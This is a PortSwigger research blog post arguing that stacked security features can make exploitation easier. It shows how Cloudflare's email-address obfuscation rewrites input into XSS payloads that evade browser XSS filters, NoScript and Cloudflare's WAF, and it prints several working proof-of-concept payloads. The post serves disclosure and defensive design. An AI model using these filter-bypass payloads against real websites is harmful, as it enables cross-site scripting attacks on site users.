---
source: portswigger-research
source_url: https://portswigger.net/research/when-security-features-collide
title: "When security features collide | PortSwigger Research"
published: 2017-10-06T15:35:00
description: "Layered security mechanisms are forcefully promoted by industry standards such as PCI DSS and (briefly) the OWASP Top 10. In this post, I’ll argue that the blanket application of such an approach is b"
---

# When security features collide

![James Kettle](https://portswigger.net/content/images/profiles/callout_james_kettle_112px.png)

### [James Kettle](https://portswigger.net/research/james-kettle)

Director of Research

[@albinowax](https://twitter.com/albinowax)

- **Published:** Friday, 6 October 2017 at 15:35 UTC

- **Updated:** Monday, 2 October 2023 at 14:37 UTC


![Security Feature Problems](https://portswigger.net/cms/images/21/23/3039a5366769-article-when-security-features-collide-article.png)

Layered security mechanisms are forcefully promoted by industry standards such as PCI DSS and (briefly) the [OWASP Top 10](http://www.skeletonscribe.net/2017/04/abusing-owasp.html). In this post, I’ll argue that the blanket application of such an approach is both misguided and hazardous, by showing that stacking security measures in front of a system may make it easier to exploit. I’ll demonstrate this by sharing how to use Cloudflare's email protection system to bypass their WAF and every browser XSS filter, on all websites using Cloudflare.

Take a website with a simple [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability. This is easy to exploit in vanilla Firefox, but really quite difficult to exploit in Chrome, Edge/IE, Safari and Firefox with NoScript thanks to their XSS filters: [https://portswigger-labs.net/xss.php?xss=<script>alert(1)</script>](https://portswigger-labs.net/xss.php?xss=%3Cscript%3Ealert(1)%3C/script%3E)

If, due to pressure from PCI, the website owner decides to start using Cloudflare, they gain a broad range of security features including DDOS protection, a [Web Application Firewall](https://www.cloudflare.com/waf/) (WAF), and email address obfuscation. These features are all enabled by default.

Cloudflare's email address obfuscation works by scanning responses for email addresses and 'mailto' links, and rewriting these to hide them from scrapers. Compare the following two responses:

`start not-an-email end

start not-an-email end``start james.kettle@portswigger.net end

start <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="650f040800164b0e001111090025150a171116120c020200174b0b0011">[email&#160;protected]</a> end
…
<script>[stuff that decodes it]</script>`

Server-side rewriting of inputs and responses can often be used to bypass XSS filters, as they rely on inspecting inputs for syntax that’s both suspicious and valid. When faced with rewriting, an attacker can provide a request containing invalid apparently harmless syntax, and rely on the server transforming it into a functional exploit. There’s a minor quirk in the email address obfuscation that makes this particularly easy; in the process of rewriting anchor tags it converts forward-slashes into spaces:

`<a href="mailto:b" a/b/c>hover</a>

<a href="/cdn-cgi/l/email-protection#4c2e" a b c>hover</a>`

We can exploit this behavior by adding a well-placed forward-slash to our payload, making it look like harmless syntax:

`<a href="mailto:a" onmouseover/="alert(1)">hover</a>

<a href="/cdn-cgi/l/email-protection#1372" onmouseover ="alert(1)">hover</a>`

This payload bypasses Chrome/Safari and Edge’s filters, but still gets snagged by NoScript and Cloudflare’s WAF. To bypass those, we just need to add another slash:

`<a href="mailto:a" onmouseover/="alert/(1)">hover</a>

<a href="/cdn-cgi/l/email-protection#90f1" onmouseover ="alert (1)">hover</a>`

This leaves us with a simple exploit that evades the XSS detection in Chrome/Safari, Edge/IE, NoScript, and Cloudflare’s WAF.

This article originally finished here, but it felt like the slash-consumption quirk made our lives a little too easy. It would be too tempting for readers to dismiss this as a one-off mishap by Cloudflare that wouldn't possibly affect similar offerings from other companies. To address this, my colleague Gareth Heyes devised the following payload that doesn't rely on the slash-consumption quirk. Instead, it uses malformed syntax to confuse the cloud-based HTML parser - an approach that's likely to work on multiple vendors and distinctly difficult to mitigate:

![](https://portswigger.net/cms/images/migration/blog/whensecurityfeaturescollide-diagram.png)

The payload is less pretty after being rewritten by Cloudflare, but gets the job done:

`<select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert(1)</script x>

<select><noembed></select><script x='<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c8a988aa">[email&#160;protected]</a>'a>y='<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d5b495b7">[email&#160;protected]</a>'//<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="6e0f2e0c">[email&#160;protected]</a>
\u0061lert(1)</script x>`

After this post was released, @jackmasa found a [variant using XMP instead of noembed](https://twitter.com/jackmasa/status/916499442538225664), and @kinugawamasato released a stunning Chrome bypass [combining nested scripts with foreign object and replaceChild](https://twitter.com/kinugawamasato/status/916393484147290113).

### Conclusion

Adding one security mechanism can undermine multiple others. This isn’t just an isolated incident - Masato Kinugawa recently found that Cloudflare injects a number of scripts at /cdn-cgi/, and one of these could be used to [bypass not only Chrome’s XSS filter, but also whitelist-based CSP](https://twitter.com/kinugawamasato/status/893404078365069312).

It probably isn’t necessary to say this, but please don’t be overly concerned if you’re using Cloudflare. Cloudflare was only selected as an example thanks to their popularity. The attack shown relies on an already-existing XSS vulnerability, and the obfuscation bug described here will probably be short-lived; Masato’s bug was [mitigated within 24 hours](https://twitter.com/timstrazz/status/893682060052709378) of being publicly disclosed. You can also easily toggle off the obfuscation feature without losing the core benefits of Cloudflare.

The real takeaway is to consider the consequences before blindly prescribing flashy security features, ensure you disable unused functionality, and remember that a reduction in attack surface can do more for your security than dozens of flimsy mitigations.

[Back to all articles](https://portswigger.net/research/articles)

## Related Research

[05 February 2026](https://portswigger.net/research/top-10-web-hacking-techniques-of-2025) [06 January 2026](https://portswigger.net/research/top-10-web-hacking-techniques-of-2025-nominations-open) [**The Fragile Lock:**\\
Novel Bypasses For SAML Authentication 10 December 2025The Fragile Lock:Novel Bypasses For SAML Authentication](https://portswigger.net/research/the-fragile-lock) [**Introducing HTTP Anomaly Rank** 11 November 2025Introducing HTTP Anomaly Rank](https://portswigger.net/research/introducing-http-anomaly-rank)